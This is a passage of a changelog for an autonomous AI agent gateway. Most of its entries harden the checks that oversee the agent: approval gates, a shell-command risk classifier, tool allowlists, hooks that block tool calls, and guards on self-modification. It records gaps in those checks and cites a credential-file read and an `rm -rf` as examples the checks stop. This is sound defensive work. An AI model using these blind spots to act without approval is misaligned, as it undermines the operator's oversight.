- Loop seams: `result.stopReason` (natural|maxTurns|budget|hook|guard|
  aborted) and `rescuePrompt` override (segment boundaries ask for the
  state block, not a user-facing answer).

## 3.126.0 — SECURITY: risk path-arg blind spot + maxTurns rescue + swarm honesty

- **SECURITY (live-fired blind spot)**: `xclaw_file_write` passes `file_path`
  — a key risk.mjs `extractPaths` never inspected → no paths extracted →
  scope defaulted "workspace" → an OUTSIDE-workspace write tiered **low**
  and auto-ran under `autoApproveMaxTier` with no approval and no policy
  record (observed live: the bot wrote `/root/<file>.md` with zero
  prompts). Same arg-key blind-spot class as the 3.122 edit-surface
  BLOCKER — which had its own exhaustive list that risk.mjs didn't share.
  Fixed threefold: (1) `PATH_ARG_KEYS` single-sourced in risk.mjs
  (self/profile.mjs now imports it) and extended (file_path/filePath/
  destination/output/old_path/new_path/…); (2) a WRITE tool with no
  resolvable path now fails closed to conservative scope instead of
  defaulting "workspace"; (3) `authorize` gained `riskWorkingDir` and the
  loop passes its real run workspace — non-exec tools previously scoped
  against the gateway's cwd (mission worktree autonomy verified preserved).
- **maxTurns final-answer rescue**: hitting the turn budget mid-work used to
  discard everything (live: a 5-node research swarm returned five
  "Stopped after 6 turns" stubs, 0/5 ballots — and still reported done/ok).
  The loop now makes one final no-tools model call asking for a best-effort
  answer from work so far. Off via `agent.finalAnswerRescue:false`.
- **Swarm honesty**: a node whose only output is the maxTurns stub now counts
  as failed (`NO_OUTPUT`, status `truncated`) so the run degrades honestly;
  an attempted-but-all-failed ballot parse adds a loud VOTE FAILED summary
  line. Prose-only swarms without ballots are unaffected. Research role
  default maxTurns 6 → 8 (config-overridable per run).

## 3.125.0 — quote-aware read-only classifier + /trust bounded auto-run window

Live observation an hour after 3.124.0: an owner audit session produced an
approval storm — 52 manual inline-button approvals in ~30 minutes, nearly all
for provably read-only commands the regex classifier could not admit
(`cd X && cat Y`, `sed -n '1,120p' f`, `awk 'NR>=6 && NR<=30' f`, quoted
`grep "TODO|FIXME"` patterns).

- **Classifier v2 — quote-aware scanner** (`scanCommand`): models real bash
  semantics — single-quoted text is inert; inside double quotes `$(` and
  backtick still substitute but `>` `<` `|` `;` `&` are inert; splits chains
  only outside quotes; unterminated quotes/subshells/redirects fail closed.
  New heads: `cd` (process-local), `sed` (print-slice shape only, `-i`/`-f`
  reject), `awk` (inline single-quoted program; comparisons fine; residual
  `>` `<` `|`, `system`, `getline` reject).
- **`/trust <30m|2h|off|status>`** channel command: owner-granted bounded
  trust window on the approval gate — raises the auto-approve ceiling to
  **risky** (hard ceiling; critical ALWAYS pends) for 1min–4h, in-memory
  (a gateway restart clears it), journaled to the ops ledger on set/clear.
  Per-command pins can't absorb a varied audit session; a supervised window
  can.

## 3.124.0 — eviction protects the current ask + approval-prompt precision

All three from watching the owner's live DM session minutes after 3.123.0
shipped (the new prompt-delivery logging paid for itself immediately):

- **Eviction could silently drop the CURRENT user message mid-turn**: one
  heavy tool turn (14 file_reads = 28 messages) slid the triggering ask out
  of the window (maxMessages 40, protectRecent 4) and — because hybrid
  policy suppresses the eviction notice — the model concluded "your message
  came through empty" and answered a non-empty DM with nothing. The sliding
  window (both pair-aware and simple paths) now retains the newest real user
  message whenever no newer one is kept; superseded asks are still evictable
  and eviction notices don't count as real user messages.
- **Read-only classifier precision** (from the owner's actual blocked
  commands): fd duplication (`2>&1`) and `/dev/null` sinks no longer
  disqualify — `pm2 describe x 2>&1 | head -50` was pending on the raw `>`
  gate; `pm2 logs --nostream` is recognized as a bounded read. Boundary
  guard prevents the `2>/dev/nullX` fake-sink bypass.
- **No more duplicate approval prompts**: the loop re-emits
  `approval_required` as a state update when authorize times out; the owner
  received identical Telegram prompts exactly 120s apart and tapped Allow on
  pendings whose turn had already moved on. The timeout re-emission now
  carries `timedOut: true` and Telegram skips it, plus per-pendingId dedupe
  that latches only on successful delivery.
- Confirmed live (closing 3.123.0's unknown): approval prompts DO reach the
  owner — inline-button callbacks are his normal approval path.

## 3.123.0 — read-only exec risk classification

Fresh live observation: on the DM bot every diagnostic command (`pm2 list`,
`tail`, `cat`, `df -h`) tiered "risky" and pended the full approval SLA
identically to genuinely dangerous commands — the A2 audit hardened the
dangerous direction but the safe direction was never built, which made
`security.autoApproveMaxTier` useless for channel bots (observed live: an
owner diagnostic request died on SLA timeout; another needed a manual
`/approve` for a `pm2 list`-class command).

- **`isReadOnlyExecCommand()`** in `src/security/risk.mjs`: deterministic,
  FAIL-CLOSED classifier — every pipeline/chain segment must have a bare
  head in the read-only set (or a constrained subcommand for
  git/pm2/npm/systemctl/find/journalctl/crontab/env); any redirection,
  substitution, subshell, path-prefixed head, or env-prefix disqualifies.
  Verified read-only chains map to tier **"low"** (never "safe" — reads can
  exfiltrate), overridable via `security.risk.tiers.readOnlyExec`.
  Credential-path reads (`cat ~/.ssh/id_rsa`) stay **critical** — the
  irreversible fact outranks the read-only path.
- With `security.autoApproveMaxTier: "low"` a channel bot now auto-runs
  provable diagnostics and still pends writes/risky/critical to the owner.
- Telegram `notifyOwnerApproval` now logs prompt delivery/failure — the
  gateway log previously could not show whether an approval prompt ever
  reached the owner.

## 3.122.1 — suite determinism + append-only rotation + alerter singleton fix

Mandate-2 closeout hygiene (all three found by re-reading the shipped arc):

- **Ops maintenance timer** (`src/ops/maintenance.mjs`): closes the audit's
  accepted finding "unbounded append-only files (rotation deferred)".
  `compactLedger()` existed but was CLI-only — nothing ever ran it; the
  gateway's daily ops timer now compacts the ledger (90d retention) and
  size-rotates the host-global JSONL appenders (router-events, cost-ledger,
  cron/doctor logs): head archived to `<file>.1`, newest line-aligned tail
  kept in place so live readers keep their recent window.
  `ops.maintenance {enabled, intervalMs, maxBytes, keepBytes}`.
- **Shared alerter no longer freezes target-less**: `getSharedAlerter` was
  first-caller-wins (the 3.102.1 approval-gate singleton class) — a bare-`{}`
  early caller silenced every later alert with `no_targets` even after
  `alerting.targets` was wired (observed live at 08:48). It now upgrades in
  place when a caller offers a config that resolves targets; never downgrades.
- **Deflaked the pending-approval tests** (`gateway-routes-security`,
  `system-run-plan-gate`): short SLA timeouts + fixed sleeps raced the
  parallel-suite load (observed 1/5 full-suite failure); now generous
  timeouts + deadline-polling for pending registration. Suite determinism is
  load-bearing — A4 self-deploy gates on it.
- Changelog backfilled for the mandate-2 arc (3.112.1–3.122.0 below).

## 3.113.0 → 3.122.0 — Mandate-2: autonomous engineering OS (backfill)

Ten slices + adversarial audit, each live-proven; full detail in
`docs/NEXT-LEVEL-AUDIT.md` §Mandate-2 arc.

- **3.113.0 (A1)** operational ledger — durable JSONL black box, graph by
  joins on correlation ids; `xclaw ledger tail|query|who-touched`; `GET /ledger`.
- **3.114.0 (B1)** persistent repo intelligence — incremental index keyed by
  git-common-dir (worktrees share it), notes + compounding brief,
  `xclaw_repo_intel` tool for all runs.
- **3.115.0 (A2)** zero-trust risk policy — facts→tier safe|low|risky|critical,
  durable allow-always pins (fingerprinted, TOCTOU-safe), missions
  `autoApprove` → `autoApproveMaxTier`.
- **3.116.0 (A3)** time-travel — commit-on-merge with `XClaw-Mission:` trailer,
  `refs/xclaw/*`, `xclaw timeline list|diff|revert|attribute`.
- **3.117.0 (B3)** economic routing — model metadata + measured stats +
  governor normal|economy|halt band; verify never auto-downshifts.
- **3.118.0 (B5)** Mission Control live canvas — swarm WS producer wired,
  zero-dep SVG DAG live-patched from events.
- **3.119.0 (B2)** hierarchical context — dormant `summarizeFn` wired to a
  cheap model, fold-of-folds, mission phase carryover.
- **3.120.0 (B4)** swarm blackboard + dynamic roles (narrow-only tool
  intersection) + `voteNodes` + tournament strategy (winner-only merge).
- **3.121.0 (A4)** self-modification loop — self profile + edit-surface guard
  + autonomous merge→deploy→health→auto-rollback via `xclaw self-deploy watch`;
  live-proven incl. fire-drill rollback.
- **3.122.0** adversarial audit — 2 BLOCKERs (edit-surface arg-key bypass;
  tournament merged all competitors) + 10 HIGH/MED closed.
- **3.112.1** doctor pm2-daemon leak fix — doctor only queries pm2 when a
  daemon already exists (612 orphaned God Daemons / 13.6GB on a live host).

## 3.112.0 — tmp sweeper + LSP cancellation + doctor accuracy

Fresh-observation release #2 (all three from reading the live host).

- **Stale-tmp sweeper**: `xclaw sweep-tmp [--dry-run] [--max-age-h N]` +
  `src/ops/tmp-sweeper.mjs` — removes `/tmp/xclaw-*` entries older than 24h
  that no stored mission worktree references (a live host had accumulated
  10k+ from suite runs; the first sweep removed 10,330 with zero errors).
  The gateway runs it daily (`ops.tmpSweep.enabled: false` to opt out) and
  doctor warns at >50 stale entries (`ops.tmp`).
- **LSP cancellation**: `$/cancelRequest` honored (in-flight completions
  answer -32800 instead of landing late), and a newer completion request
  for the same document supersedes the older in-flight one — safe to use
  with aggressive editor auto-trigger.
- **Doctor accuracy**: `computer.watchdog` and `eval.cron` used to warn
  "not running (start gateway)" while the gateway was demonstrably up —
  they read process-local state. `/gateway/info` now exposes a sanitized
  `ops` block (computerWatchdogActive / evalCronRegistered /
  channelWatchdogRunning) and doctor consults the RUNNING gateway when
  reachable.

## 3.111.0 — Channel outage alerting + self-healing dedicated browser

Fresh-observation release (post-NEXT-LEVEL): both items came from reading the
live host — a day of `[telegram] poll error` bursts that alerted nobody, and
a Control-browser pm2 unit at 425 restarts from stale Chrome Singleton locks.

- **Channel outage alerting**: the Telegram poll loop now reports poll-level
  liveness (`onPollOk` → `lastPollOkAt` / `lastPollErrorAt` /
  `consecutivePollFails` in channel status — `messagesHandled` is useless
  for a quiet DM bot). The channel health watchdog raises a real alert
  (shared alerter → doctor-cron delivery / PagerDuty) on the outage
  TRANSITION (consecutive failures ≥ `channels.healthWatchdog.pollFailThreshold`
  (8) or last successful poll older than `outageAfterMs` (5 min) with newer
  errors), emits a recovery event to live Control surfaces, and also alerts
  when the restart circuit opens — which used to give up silently. This is
  the channel-side twin of the 3.92.1 lesson: loop alive ≠ service reachable.
- **`xclaw browser`** — dedicated UI browser launcher with singleton-lock
  self-healing: reads the `SingletonLock -> hostname-pid` symlink, clears
  locks whose owner pid is dead on this host (never steals live or
  foreign-host locks), refuses profiles held by a live non-CDP Chrome
  without `--force`, detects an already-running CDP instance, and runs
  Chrome in the foreground for supervisors. Live-proven: `kill -9` on the
  running Chrome → pm2 relaunch through `xclaw browser` → locks healed →
  CDP back up, no crash-loop.

## 3.110.0 — LSP server over the completion service

Post-roadmap candidate 5 (final): editor integration without an editor-
specific plugin.

- `xclaw lsp` — zero-dep Language Server Protocol over stdio
  (`src/completion/lsp.mjs`): Content-Length framing with an incremental
  parser, full-document sync, `textDocument/completion` backed by the
  repo-aware completion service. Workspace root → `repoDir`; the completion
  is built from the LIVE buffer at the cursor (prefix ≤8k, suffix ≤2k).
  Works with neovim, helix, or any generic LSP client (docs/COMPLETION.md
  has copy-paste configs).
- 35ms initialize; live-proven end-to-end: real
  `textDocument/completion` returned `return farewell(name).toUpperCase();`
  for a buffer importing the repo's own module, 1.65s via claude-sonnet-5.
- Also documents the full completion surface (HTTP/CLI/LSP) in
  docs/COMPLETION.md.

## 3.109.0 — Workers CLI bootstrap + federation TLS guidance

Post-roadmap candidate 4.

- `xclaw workers list|add|remove|ping` (coordinator) and
  `xclaw workers token|join-command` (worker bootstrap): `token` ensures the
  worker gateway has an operator token (generates + persists once);
  `join-command` prints the exact `xclaw workers add …` line for the
  coordinator, flagging non-loopback plain-http with a TLS pointer instead
  of silently emitting `--allow-insecure`.
- `src/missions/workers-cli.mjs` shared core (same registry as the routes/UI;
  tokens redacted in listings, persisted 0600 via saveConfigPatch).
- `docs/FEDERATION.md`: worker/coordinator setup, reverse-proxy TLS examples
  (Caddy/nginx), URL policy rationale, credential-isolation rules (never
  share an anthropic OAuth store between gateways).
- Live-proven: CLI add → ping (version + computer health) → join-command
  echoing the live token unchanged → remove.

## 3.108.0 — Point-and-prompt in the webchat

Post-roadmap candidate 3: the picker is no longer Control-UI-only.

- The webchat composer gains a 🎯 button: prompts for the app URL (+ optional
  repository path, both remembered), arms the picker overlay in the app's tab
  via POST /point/pick, and drops the picked element's descriptor + resolved
  source locations (/point/resolve) into the composer — the chat agent takes
  it from there with its normal tools.
- Live-proven: 🎯 → real click on a running page's element → composer
  auto-filled with `[pointed element] <p class="tagline">…` + correct
  `src/index.html:11, src/style.css:3` resolutions.

## 3.107.0 — Phase-aware mission resume + transactional worktree merge

Post-roadmap candidates 1 & 2.

- Missions record `executedAt` when the execute phase completes; resume maps
  failed/interrupted missions to planning | executing | verifying by ACTUAL
  progress — a mission that died mid-execute re-runs its implementation
  instead of skipping to verification. Swarm missions resume their fan-out
  journal (terminal-ok nodes replayed, only missing work re-runs).
  Live-proven: gateway killed mid-execute → boot reconcile marked the
  mission interrupted → resume re-entered at executing → merge_ready →
  merged.
- `applyWorktreeMerge` is transactional: `git apply --check` runs BEFORE any
  untracked copy (a failing patch leaves the repo byte-untouched — previously
  copies landed first), existing destinations are conflicts instead of silent
  overwrites (identical content = idempotent re-merge), and a post-check
  apply failure rolls the copies back (`rolledBack: true`).

## 3.106.1 — completion path containment

Commit security review follow-up: `buildCompletionContext` now refuses a
target file that resolves outside `repoDir` (`../../x` or absolute escapes →
empty context, no out-of-repo reads). The arbitrary-`repoDir` surface of
/complete//missions//point is acknowledged by design: those routes are
operator-token gated, and the operator already holds `xclaw_bash`-level host
access — same trust class, no widening.

## 3.106.0 — Repo-aware code completion service

Final NEXT-LEVEL roadmap increment: completion-aware code completion.

- `src/completion/service.mjs`: fill-in-the-middle over the provider chat
  API with repo-intel neighborhood context — symbols from the files the
  target imports (parsed from the LIVE editor buffer first: new/unsaved
  files are the common case, disk may be stale) plus files that import the
  target. Fence/echo cleanup; suffix-echo cut. Provider resolves exactly
  like agent runs (OAuth hot-path refresh, failover, cost accounting).
- `POST /complete {prefix, suffix?, file?, repoDir?, language?}` —
  token-gated in BOTH auth modes (each call spends provider tokens).
- `xclaw complete [file] [--repo dir] [--suffix code] [--lang js]` — prefix
  on stdin, completion on stdout (editor-pluggable).
- Live-proven: gateway completion for a NEW file resolved contextFiles from
  the prefix buffer's requires and used both repo APIs correctly (~2s,
  claude-sonnet-5); CLI round-trip returned `return clamp(x, 0, 100);`.

## 3.105.0 — Remote mission workers (federation)

Roadmap increment: dispatch missions to OTHER xclaw gateways and drive them
from one Mission Control.

- `src/missions/remote.mjs`: worker registry (`cfg.missions.workers`
  `[{name,url,token,allowInsecure?}]`, tokens redacted in every listing),
  URL policy mirroring provider base-urls (https anywhere, plain http
  loopback-only unless allowInsecure), start/list/get/diff/merge/rollback
  proxies + `pingWorker` (version + computer health via the sanitized
  `/gateway/info`).
- Routes under the existing `/missions` auth umbrella, matched BEFORE the
  `:id` regex: `GET|POST /missions/workers`, `DELETE /missions/workers/:name`
  (config-persisted via saveConfigPatch), `POST /missions/remote` dispatch,
  `GET /missions/remote/:worker[/:id[/diff]]`, `POST …/merge`, `POST …/rollback`.
- Control UI: Remote workers card (add/ping/list/remove; per-worker mission
  table with remote Merge/Rollback) and a launch-target selector (local or
  any worker) on the mission form.
- The worker's OWN evidence gate, approval story, and token auth apply
  unchanged on its host; `repoDir` is a worker-side path. Coordinator and
  worker can run different models.
- Live-proven: a second gateway (ollama `glm-5.2:cloud`, shared computer
  plane) registered as `w1`; the coordinator dispatched a mission, tracked
  it to merge_ready through the proxy, merged remotely, and the worker's
  repo gained the module + test (suite green on the worker repo).

## 3.104.0 — Visual point-and-prompt (element → source → change → rebuild → verify)

Roadmap increment: point at an element in the RUNNING app, describe the
change, and a mission lands it at the element's real source — verified.

- `src/browser/cdp-client.mjs`: zero-dep CDP client primitive (loopback-only
  by default) for driving the operator's own display browser — list/attach/
  new-tab, evaluate, navigate, screenshot, raw `send`. No bundle, no fabric
  leases: the picker overlay appears in the browser the operator is looking at.
- `src/intel/element-resolver.mjs`: element descriptor → ranked repo
  locations, pure lexical scoring (id/getElementById/`#id` 40, data-attrs 20,
  visible text 25, class names 8 with 3-char utility classes dropped; markup
  files get a defining-file bonus). `PICKER_JS` = injected one-shot overlay
  picker (hover highlight, click captures descriptor, Esc cancels).
- Routes (token-gated both modes): `POST /point/pick` (opens/attaches the
  target page — NEVER the Control tab itself — arms the picker, returns the
  clicked element), `POST /point/resolve` (preview ranked locations),
  `POST /point/mission` (launch a mission with the element + resolved
  locations pinned into the goal). Control UI: "Point & Prompt" card in the
  Missions view.
- `scanRepo` now includes UI file types (html/css/scss/vue/svelte) — element
  resolution and front-end missions need them in the intel scan.
- Live-proven end-to-end on the display: real CDP click on a running app's
  `<h1>` → resolver ranked its html/css definition sites → mission changed
  exactly `.hero-title { color: red → #0b57d0 }` → tests passed → merged →
  page reloaded with computed color rgb(11, 87, 208).

## 3.103.0 — Swarm-backed missions

Missions can now execute as a dependency-aware swarm instead of a single
agent (`strategy: "swarm"` on POST /missions / the Control-UI selector, or
`cfg.missions.strategy`). Roadmap increment "swarm-backed missions".

- The plan phase asks the model for a fenced ` ```xclaw-mission-tasks ` JSON
  graph (2–6 nodes, roles implement/research/verify, `dependsOn` ordering);
  `parseMissionTasks` validates via the swarm's own `normalizeTaskGraph`
  (last block wins). Caller-provided `tasks` skip the plan model run
  entirely. An unparseable graph degrades honestly to solo execute.
- Execute fans out via `runSwarmFanOut` INSIDE the mission worktree:
  implement nodes get their own worktrees branched from the shadow
  workspace and early-merge back into it — the user's repo stays untouched
  and the evidence gate (verification-before-merge_ready) is unchanged. A
  failed fan-out degrades to the solo execute path.
- `approvalGate` is threaded through `spawnSubagent` and the swarm input so
  every node inherits the mission's worktree autonomy (same shared-gate
  singleton hazard fixed for solo missions in 3.102.1).
- Mission records carry `strategy` + `swarm {tasks, runId, nodes}`; Control
  UI shows Strategy and per-node status in the mission detail.
- Live-proven: a swarm mission on a real repo — model authored a 2-node
  graph, both nodes ran in parallel, early-merged, verification passed with
  the nodes' own tests, merge landed 4 new files.

## 3.102.1 — Mission approval-gate override + tool pairing invariant + resume evidence gate

Three real bugs found while live-verifying 3.102.0 through the gateway (a
mission failed with Anthropic 400 "tool_use ids were found without tool_result
blocks"; the full chain was reproduced and pinned in tests):

- **Missions now build their own approval gate** from the mission-scoped
  config. The loop's default is a process-wide shared gate (first caller
  wins) that a live gateway primes with `autoApprove:false` — silently
  overriding the mission's declared worktree autonomy: every exec tool
  pended for a human who was never asked, timed out after 120s, and the
  mid-batch stop skipped remaining calls. Hooks still compose through the
  mission gate.
- **tool_use/tool_result pairing invariant** in the agent loop: when a
  pending-approval or guard stop ends a turn early, remaining tool calls in
  the batch now get explicit "Not executed" tool messages (+ a
  `tool skipped` event) instead of orphaned tool_use blocks that 400 the
  next provider request.
- **Resume cannot bypass the evidence gate**: `resumeMission` maps
  `failed` → `verifying` (a stale failed status used to skip every phase
  block in `runMission` and fall through to `merge_ready` with zero
  evidence), and `runMission` now structurally refuses `merge_ready`
  without a recorded passing verification run.

## 3.102.0 — Mission integrity: tool scoping, complete merge evidence, artifact-free merges

Evidence-driven increment. The planned "local-plane fast file ops" roadmap item
was killed by measurement (an instrumented live mission put ALL tool time at
0.6s of a 260s wall — computer-plane file ops run in 5–20ms; the wall-clock is
model turns + npm install/test). What the measurement surfaced instead:

- **Run-scoped tool allowlist** (`cfg.agent.allowTools`, new
  `src/agent/tool-filter.mjs`): exact names + trailing-`*` globs, enforced on
  BOTH the advertised schema list and dispatch (hallucinated names get a
  blocked tool result). When the filter can never match `mcp__*`, MCP servers
  are not connected/spawned at all for that run. No filter configured = no
  behavior change.
- **Missions default to a code-work tool scope** (`DEFAULT_MISSION_TOOLS`;
  override `cfg.missions.allowTools`, `false` disables): bash + file ops +
  glob/grep + web search/fetch + skills/recall. Closes a real autonomy gap:
  mission agents run `autoApprove: true` for worktree isolation, but that
  blanket approval also covered 58 MCP tools (incl. Linear WRITE ops), browser,
  image-gen, X/finance tools — side effects far outside the worktree. It also
  drops ~100 irrelevant schemas from every mission model turn.
- **Merge evidence now shows everything the merge will do**: mission diffs
  include untracked (new) files — previously the human approved a merge seeing
  only the tracked patch while `applyWorktreeMerge` silently copied new files.
  New-file contents are synthesized into the patch via
  `git diff --no-index` (`untrackedPatch`), listed in `diff.untracked`, and
  shown in Mission Control ("New files" row).
- **Verification artifacts never merge**: `runVerification` snapshots untracked
  files before/after (its own `npm install` creates lockfiles etc. →
  `mission.verify.artifacts`), and `applyWorktreeMerge` gained
  `excludeUntracked` patterns (`partitionUntrackedByExcludes`). Missions merge
  with `DEFAULT_MERGE_EXCLUDES` (node_modules, package-lock.json, venv/pycache
  caches; extend via `cfg.missions.mergeExclude`) + recorded artifacts.
  Excluded paths are reported honestly (`diff.excludedUntracked`, merge result
  `excluded`, "Excluded" row in Mission Control).
- Tests: `test/tool-filter.test.mjs` (filter semantics + loop advertise/dispatch
  enforcement, hermetic) and `test/mission-merge-evidence.test.mjs` (pattern
  partition, untracked patch synthesis, real-git merge with exclusions,
  missionCfg scoping).

## 3.101.0 — Autonomous engineering missions (plan→verify→repair→prove) + Mission Control

The first increment of XClaw's autonomous-engineering core: take a high-level
objective and a repo, and carry it through to a proven result with minimal
intervention. Built by COMPOSING existing primitives (worktrees, approval gate,
sandbox/egress, hooks, provider routing) — nothing ripped out. Full audit +
roadmap: docs/NEXT-LEVEL-AUDIT.md; guide: docs/MISSIONS.md.

- **Codebase intelligence** (src/intel/repo-intel.mjs) — assembles the RIGHT
  task context (repo structure + regex symbols + import graph + lexical search
  + git change-frequency, ranked) instead of dumping code at the model.
- **Mission engine** (src/missions/engine.mjs) — plan → execute → verify →
  repair → merge_ready → merge/rollback, entirely in an isolated git
  worktree (the shadow workspace). The user's repo is byte-untouched until an
  explicit gated merge; rollback discards the worktree. Verification runs the
  project's OWN checks (npm/pytest/go/cargo auto-detected); a mission can NEVER
  reach merge_ready without a recorded passing run — success is never claimed
  without evidence. Bounded repair loop on failures.
- **Durable state + recovery** (src/missions/store.mjs) — atomic per-mission
  persistence; boot reconciliation marks crash-interrupted missions resumable;
  resumeMission continues from the recorded phase (recreating a vanished
  worktree if needed). Terminal statuses guarded against late-handler clobber.
- **Mission Control** — /missions routes (token-gated both auth modes) + WS
  mission channel + a Control-UI section: launch, live progress, verification
  evidence, timeline, diff, and gated Merge / Resume / Rollback.
- Carried-over fix: approvals now show a **hook** origin badge when a
  pre_tool_use hook (not policy) demanded human review.
- runAgentLoop gained provider/hookManager injection seams (hermetic tests).

Live-proven end-to-end on the operator display: a real model fixed a real bug
(cart total ignoring quantity) in a real repo through Mission Control — planned,
edited in a shadow worktree, verified with the project's own npm test (PASS),
and merged only after the human clicked Merge; the repo stayed byte-identical
until then and npm test passed afterward.

Adversarial pass found + fixed a path-traversal (a crafted mission id read
arbitrary .json under the config dir, e.g. credentials.json) and a rollback
race (an aborted run clobbered the terminal status) — both regression-pinned.
Suite 1463/0.

## 3.100.1 — command-hook runner: survive fast-exiting hook scripts (EPIPE)

A command hook that exits before stdin is written (one-liner `exit 2` guards
under load) emitted an async EPIPE on the child's stdin, rejecting the hook
with the wrong error instead of honoring the exit-code verdict — surfaced as a
load-dependent flake in the 3.100.0 pre-ship suite (which the ship script then
failed to gate on; this release's ship WAS gated). stdin errors are now
swallowed — the exit code is the verdict. Suite 1453/0 twice consecutively.

## 3.100.0 — hook system v2: tool-phase hooks, command hooks, matchers, stop veto, runtime management

Market-parity-plus upgrade after studying the field (Claude Code's 30-event hook
architecture being the bar):

- **pre_tool_use / post_tool_use** — matcher-scoped hooks on every tool call.
  System hooks return `{decision, reason}` merged deny > ask > allow: deny
  blocks before dispatch, **ask escalates to the human approval gate even on
  auto-approve policy** (hooks compose with the security stack, never bypass
  allowlists), and `{args}` rewrites input before the security plan binds.
  post_tool_use may rewrite the result text the model sees.
- **on_stop veto cycle** — a system hook may veto a clean completion
  (`{abort:"reason"}`): the reason is injected as a user turn and the loop
  re-enters, capped by hooks.stopBlockCap (default 2); `stopHookActive` guards
  against hook loops. Never fires on guard/budget/approval/abort stops.
- **Command hooks (out-of-process)** — hooks.commands[] run as separate
  processes in any language: JSON context on stdin, JSON verdict on stdout,
  exit 2 = universal block. Real isolation: the script never touches gateway
  memory regardless of tier.
- **Matchers** (`xclaw_bash|bash`, `mcp__github__*`) + `once` self-removing
  hooks.
- **Runtime management** — GET /hooks + /hooks/history, POST /hooks/toggle,
  POST/DELETE /hooks/commands (persisted + hot-applied, token-gated in both
  auth modes) and a Control-UI **Hooks** section: category toggles, hook
  table, execution history, command-hook editor.

Live-proven on the operator display: a `no-rm` command hook added through the
UI (system tier, matcher xclaw_bash|bash) hot-applied without restart and
denied a real agent's `rm -rf` attempt before dispatch — the model received
"Tool xclaw_bash blocked by hook: rm -rf is not allowed on this host." The
hook stays installed. 11 new tests; suite 1453/0.

## 3.99.1 — MCP OAuth callback: escape rendered error text (XSS)

Security-review follow-up: the auth-exempt `/mcp/oauth/callback` page rendered
its title/subtitle unescaped — the failure branch interpolates exchange error
text, which can carry a remote authorization server's `error_description`.
All interpolations are now HTML-escaped; pinned by a reflection test. Suite 1442/0.

## 3.99.0 — lifecycle hook system (dynamic, tiered, failure-isolated)

New `HookManager` (src/hooks/manager.mjs) with five lifecycle categories wired
into the agent loop: `pre_process` (may rewrite the incoming message or —
system tier — abort the run before any model call), `on_request` /
`on_response` (every turn), `post_process` (may transform the final text,
runs BEFORE the transcript save so redactions persist), `on_error` (observes
loop failures; the error still propagates).

- **Registration API**: registerHook/removeHook/listHooks/history with hard
  validation (category, callable, single-context-arg arity, tier).
- **Permission tiers**: system (full context incl. cfg + live messages, may
  mutate + abort) · trusted (redacted context, may mutate whitelisted fields)
  · user (read-only sanitized copy, returns ignored). Config-loaded modules
  are capped at the tier the OPERATOR assigns in `hooks.modules[]` — a module
  claiming system is clamped and the attempt logged.
- **Isolation**: per-hook try/catch + timeout (hooks.timeoutMs, default 2 s);
  a throwing or hanging hook is recorded and skipped, never crashes the run;
  executeAll never rejects.
- **Logging**: every registration/execution in a 200-entry ring buffer +
  stdout lines (hooks.log).
- **Config**: hooks.enabled global kill-switch, per-category disables,
  module loading from xclaw.json.
- **Examples** (src/hooks/examples.mjs, one per tier): redact-secrets
  (system, post_process), timestamp-context (trusted, pre_process),
  timing-logger (user, request/response). Docs: docs/HOOKS.md.
- runAgentLoop now accepts injected `provider` and `hookManager` options
  (hermetic tests / embedders).

Live-verified on the real gateway: a config-loaded module fired on a real
agent run (timing logged per turn), and its self-claimed system hook was
clamped to user tier — its attempted output hijack was ignored (reply stayed
intact). 21 new tests; suite 1440/0.

## 3.98.1 — real-world remote MCP proven (DeepWiki + GitHub) + SSE CRLF fix

First contact with real third-party remote MCP servers, driven end-to-end through
the Control UI: **DeepWiki** (mcp.deepwiki.com — no auth) and **GitHub MCP**
(api.githubcopilot.com — Bearer PAT, session ids). It immediately caught a real
transport bug: the SSE parser split frames on `\n\n` only, but the SSE spec
allows CR/CRLF terminators and DeepWiki sends CRLF — every response buffered
forever and surfaced as "stream ended before response". Frames/lines now split
on any spec terminator; the fixture server emits CRLF to pin it.

Live-verified through UI clicks on the operator display: DeepWiki tested green
(3 tools) and `read_wiki_structure` returned real wiki content; GitHub added
with `allowTools: get_me,search_repositories` — the filter cut its ~90 tools to
exactly 2 against the real server — and `get_me` returned the operator's real
account over an Mcp-Session-Id session. Suite 1419/0.

## 3.98.0 — MCP overhaul: Streamable HTTP, OAuth 2.1, resources/prompts, spec server, full management surface

Closes the remaining 6 findings of the 2026-08-13 MCP audit (finding #1 shipped as 3.97.2):

- **Streamable HTTP client transport** (2025-03-26+): POSTs accept SSE-stream *or*
  JSON answers, sessions ride `Mcp-Session-Id` (DELETE teardown on close), the
  negotiated revision is echoed as `MCP-Protocol-Version`, notifications expect 202,
  legacy JSON-POST servers still work. clientInfo now reports the real package version.
- **OAuth 2.1 for remote servers**: RFC 9728 protected-resource discovery → RFC 8414
  AS metadata → RFC 7591 dynamic registration → PKCE S256 authorize with RFC 8707
  resource binding → token exchange + auto-refresh; per-server grants in
  `~/.xclaw/mcp-oauth.json` (0600). Browser callback at `/mcp/oauth/callback`
  (state-authenticated, auth-exempt — pinned in the matrix test); `xclaw mcp login`
  drives the flow from the CLI and polls for the grant.
- **Resources + prompts client-side**: resources/list+read and prompts/list+get
  across servers, gateway routes, and a Resources & Prompts browser in the UI.
- **Spec-compliant server**: newline-delimited stdio framing (was LSP Content-Length),
  notifications no longer get replies, protocol-version negotiation echoes supported
  revisions, real serverInfo version. Tool surface grew from 2 to 5 (skills_list,
  status_get, job_run w/ destructive annotation) and transcripts + memory files are
  exposed as `xclaw://` resources.
- **Server-initiated traffic**: stdio client answers server `ping` requests and
  surfaces notifications; `tools/list_changed` invalidates the tool cache via a
  generation counter (a timestamp-zeroing first cut lost the race against an
  in-flight list — caught by an intermittent test, fixed properly).
- **Management surface**: `xclaw mcp list/add/remove/test/login/logout` CLI,
  /mcp/servers CRUD + /mcp/servers/test + /mcp/status routes, and an MCP servers
  editor card in the Control UI (add stdio/http servers, API keys write-only,
  allowTools filters, live Test, OAuth login, remove). The gateway's MCP client now
  reads the live config, so UI/CLI edits apply without a restart — proven by adding
  xclaw's own `mcp serve` as a server through the UI and calling its tools + reading
  a real transcript resource end-to-end on the operator display.

Suite 1419/0 (5 env-gated skips).

## 3.97.2 — SECURITY: MCP tools no longer bypass the approval gate

MCP audit finding #1: under the default `risky` approval policy, only tools on the
requireApproval name list (bash/file_write) ever paused for approval — every
`mcp__<server>__<tool>` auto-ran unapproved, no matter how destructive. MCP tools
are third-party code the operator never vetted tool-by-tool, so they now default
to requiring approval. Opt-outs: `security.safeAuto` for specific tools,
`security.mcpAutoApprove: true` for all (explicit choice). Plus per-server
`allowTools`/`denyTools` config filters enforced in the client — filtered tools
never reach the agent, the UI listing, or callTool. Tool annotations/outputSchema
